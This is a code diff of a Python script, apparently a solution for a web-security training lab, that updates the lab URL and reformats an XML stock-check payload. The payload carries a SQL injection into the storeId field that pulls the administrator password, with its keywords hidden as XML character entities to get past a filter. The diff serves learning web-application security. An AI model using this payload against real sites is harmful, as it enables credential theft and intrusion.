@@ -30,14 +30,20 @@ import re
 #########
 
 # change this to your lab URL
-url = "https://0a4e002304077f40836b100800b20025.web-security-academy.net"
+url = "https://0af80068031e1d5d820d1a8a00d4007a.web-security-academy.net"
 
 print(Fore.BLUE + "[#] Injection point: " + Fore.YELLOW + "storeId")
 
 # payload to retreive administrator password
-payload = """<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>3 </productId><storeId>
-1 &#x55;NION &#x53;ELECT password FROM users WHERE username = &#x27;administrator&#x27;
-</storeId></stockCheck>"""
+payload = """<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck>
+    <productId>
+        3 
+    </productId>
+    <storeId>
+        1 &#x55;NION &#x53;ELECT password FROM users WHERE username = &#x27;administrator&#x27;
+    </storeId>
+</stockCheck>"""
 
 # set content-type header
 headers = {
